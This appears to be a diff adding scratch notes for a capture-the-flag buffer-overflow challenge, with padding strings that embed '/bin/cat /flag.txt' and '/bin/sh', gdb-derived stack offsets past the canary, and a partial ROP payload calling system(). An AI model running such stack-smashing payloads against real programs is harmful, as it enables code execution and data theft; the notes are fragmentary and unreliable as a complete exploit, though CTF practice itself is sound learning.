@@ -1,0 +1,22 @@
+/bin/cat /flag.txt\x00
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat /app/flag.txt\x00
+
+44
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh\x00
+
+
+2. Calculate the exact offsets (use gdb on the binary)
+Run the binary in gdb and find:
+
+Distance to canary = 40 bytes (exactly the size of local_38)
+Distance to saved RBP = 48 bytes
+Distance to return address = 56 bytes
+
+
+payload = b"/bin/cat /whatever.txt\x00"
+payload += b"A" * (56 - len(payload))          # reach return address
+payload += p64(pop_rdi_gadget)
+payload += p64(stack_addr_of_command)
+payload += p64(system_addr)
